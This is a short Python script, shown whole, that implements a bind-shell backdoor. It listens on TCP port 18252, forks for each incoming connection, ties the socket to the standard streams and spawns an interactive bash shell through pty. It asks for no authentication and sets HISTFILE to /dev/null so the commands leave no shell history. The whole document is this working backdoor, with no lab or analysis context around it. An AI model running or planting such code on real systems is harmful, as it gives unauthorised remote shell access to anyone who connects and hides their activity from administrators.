#!/usr/bin/env python3
import os
import pty
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 18252))
s.listen(1)
try:
  while True:
    (client, addr) = s.accept()
    pid = os.fork()
    if pid == 0:
      if os.fork() == 0:
        os.dup2(client.fileno(), 0)
        os.dup2(client.fileno(), 1)
        os.dup2(client.fileno(), 2)
        os.putenv('HISTFILE','/dev/null')
        pty.spawn('/bin/bash')
      raise SystemExit
    else:
      os.waitpid(pid, 0)
    client.close()
except KeyboardInterrupt:
  pass
except SystemExit:
  pass
s.close()
